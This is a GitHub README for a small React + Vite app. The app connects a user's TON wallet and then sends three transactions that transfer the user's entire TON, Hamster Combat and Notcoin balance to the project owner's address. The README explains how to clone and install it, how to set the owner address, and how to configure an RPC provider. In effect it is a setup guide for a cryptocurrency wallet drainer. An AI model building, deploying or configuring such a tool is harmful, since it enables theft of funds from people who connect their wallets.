# React + Vite 


desc:

this is a simple project on react that includes two buttons.
one of them connects ton wallet with tonconnect/ui-react package.
second button sends 3 transaction in a row on TON network .
transactions:transfer all the ton ,hamester combat and notcoin of user balance to owners address 


## installation

first of all clone it from git

```bash 
git clone "https://github.com/Elmirataghinasab/TON-connect-transfer.git"

```

install this projects packages from it's json file  with npm (make sure you use the same versions)

```bash
npm install 
```
change tonconnect JSON file to run your file correctly
and change owner address in the app.jsx


## Running Tests

to run test add this parts to the code (App.jsx)and test
```
const tonweb = new TonWeb(new TonWeb.HttpProvider('https://mainnet-rpc.tonxapi.com/v2/json-rpc/apikey', {
    apiKey: 'your-APi-key'  
})) 
```
faucet some TON on testnet and run script again
comment  ```const tonweb = new TonWeb();``` 



## Author

[@elmiratghinsb](https://github.com/Elmirataghinasab)



